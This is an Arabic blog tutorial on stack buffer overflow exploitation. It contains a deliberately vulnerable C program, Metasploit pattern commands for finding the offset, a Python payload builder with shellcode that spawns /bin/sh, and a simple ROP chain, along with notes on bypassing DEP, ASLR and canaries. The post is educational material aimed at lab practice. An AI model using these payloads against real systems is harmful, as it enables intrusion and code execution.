---
layout: blog
title: "Buffer Overflow من الأساس للاستغلال: رحلة عملية في أقدم ثغرة أمنية لا تزال حاضرة"
date: 2026-03-29T06:11:16Z
category: "تقنية"
excerpt: "ثغرة Buffer Overflow ليست مجرد خطأ برمجي، بل بوابة كاملة لتنفيذ أكواد خبيثة والسيطرة على الأنظمة. رغم مرور عقود على اكتشافها، لا تزال حاضرة في الأنظمة الحديثة. سنفكك هذه الثغرة من جذورها، ونفهم آليتها التقنية، ونصل للاستغلال العملي."
read_time: 8
tags: ["Buffer Overflow", "Binary Exploitation", "Offensive Security", "Memory Corruption", "Exploit Development"]
slug: "buffer-overflow-guide"
---

## فهم الـ Stack والذاكرة

لفهم Buffer Overflow، علينا البدء من الذاكرة. كل برنامج يعمل لديه Stack: منطقة ذاكرة تخزن المتغيرات المحلية وعناوين العودة للدوال. عندما تُستدعى دالة، يُحفظ عنوان العودة (Return Address) على الـ Stack لتعرف CPU أين تعود بعد انتهاء الدالة.

الـ Buffer هو مساحة محجوزة لتخزين بيانات. عندما نكتب بيانات أكثر من سعة الـ Buffer دون فحص، نتجاوز حدوده ونكتب فوق مناطق أخرى في الذاكرة. هنا تولد الثغرة.

```c
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // لا يوجد فحص للحجم
}

int main(int argc, char **argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

الكود أعلاه يستقبل مدخلات المستخدم دون فحص. إذا أدخلنا أكثر من 64 بايت، سنتجاوز الـ buffer ونكتب فوق return address.

## تشريح الاستغلال

الاستغلال يعتمد على ثلاث خطوات:

**1. التحكم في EIP/RIP**
الهدف الأول هو الكتابة فوق return address لتوجيه التنفيذ لعنوان نختاره. نحتاج معرفة المسافة (offset) بين بداية الـ buffer وموقع return address.

**2. إيجاد الـ Offset**
نستخدم pattern عشوائي فريد لتحديد المسافة بدقة:

```bash
# استخدام msf-pattern_create
msf-pattern_create -l 200
# ننفذ البرنامج مع الـ pattern
gdb ./vulnerable
run $(msf-pattern_create -l 200)
# نأخذ قيمة EIP/RIP المكتوبة
msf-pattern_offset -q 0x35624134
# النتيجة: Exact match at offset 76
```

**3. صياغة الـ Exploit**
بعد معرفة الـ offset، نبني payload:
- 76 بايت (Padding)
- 4/8 بايت (Return Address الجديد)
- Shellcode أو عنوان دالة خطرة

## بناء Payload عملي

لنفترض أننا نريد تنفيذ shellcode يفتح shell. أولاً نحتاج عنواناً ثابتاً في الذاكرة:

```python
import struct

# Shellcode لفتح /bin/sh (x86-64)
shellcode = (
    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e"
    b"\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58"
    b"\x99\x0f\x05"
)

offset = 76
ret_address = struct.pack("<Q", 0x7fffffffe400)  # عنوان الـ Stack

payload = b"A" * offset
payload += ret_address
payload += b"\x90" * 16  # NOP sled
payload += shellcode

with open("exploit.bin", "wb") as f:
    f.write(payload)
```

الـ NOP sled (\x90) يعطينا مساحة خطأ. إذا لم نصب العنوان بدقة، سننزلق على الـ NOPs حتى نصل للـ shellcode.

## الحمايات الحديثة والتجاوز

الأنظمة الحديثة ليست ساذجة. تطبق عدة حمايات:

**DEP/NX**: يمنع تنفيذ كود من الـ Stack. الحل: ROP (Return Oriented Programming) - نستخدم قطع كود موجودة (gadgets) لبناء سلسلة تنفيذية.

**ASLR**: يعشوئ عناوين الذاكرة. الحل: تسريب عنوان من الذاكرة أولاً، أو استخدام ثغرة information disclosure.

**Stack Canaries**: قيمة عشوائية قبل return address. إذا تغيرت، البرنامج ينهي. الحل: تسريب قيمة الـ canary أو تجاوزه بدقة.

مثال ROP بسيط:

```python
# بدلاً من shellcode، نستدعي system("/bin/sh")
pop_rdi = 0x400686  # gadget: pop rdi; ret
bin_sh = 0x400770   # عنوان string "/bin/sh"
system_addr = 0x400560

payload = b"A" * offset
payload += struct.pack("<Q", pop_rdi)
payload += struct.pack("<Q", bin_sh)
payload += struct.pack("<Q", system_addr)
```

## الخلاصة والممارسة

Buffer Overflow ليس مفهوماً نظرياً، بل مهارة تُصقل بالممارسة. ابدأ بمعامل بسيطة:
- جرب Protostar على exploit.education
- استخدم pwntools للأتمتة
- فهم assembly أساسي ضروري
- اقرأ كود البرامج المفتوحة للثغرات المكتشفة

كل CVE استغل buffer overflow يحمل درساً. من Morris Worm سنة 1988 إلى ثغرات حديثة في routers وIoT devices، المبدأ واحد لكن التقنيات تتطور.

المهاجم المتقن لا يكتفي بنسخ exploits، بل يفهم كل بايت في الـ payload ولماذا موضوع هناك. هذا الفهم هو الفارق بين script kiddie ومختبر اختراق حقيقي.
